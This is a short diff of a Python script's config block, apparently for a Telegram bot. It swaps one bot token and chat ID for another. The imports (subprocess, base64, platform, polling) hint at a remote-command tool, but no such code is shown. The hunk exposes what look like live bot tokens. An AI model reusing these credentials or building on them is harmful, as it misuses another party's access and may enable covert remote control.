@@ -6,8 +6,8 @@ import requests, time, subprocess, os, sys, base64, platform, threading
 # ══════════════════════════════════════════════════════
 #   CONFIG — YAHAN PASTE KARO
 # ══════════════════════════════════════════════════════
-BOT_TOKEN = "9016673967:AAEE9gRwlGlSGb26uvTVriYAcwKRVaHnFAo"    # @BotFather se
-CHAT_ID   = "9016673967"      # @userinfobot se
+BOT_TOKEN = "8901039134:AAEBI8Wn-HKC1b3IG9qzz4hIwKnKv_UyIcA"    # @BotFather se
+CHAT_ID   = "8889476230"      # @userinfobot se
 # ══════════════════════════════════════════════════════
 
 POLL_INTERVAL = 3
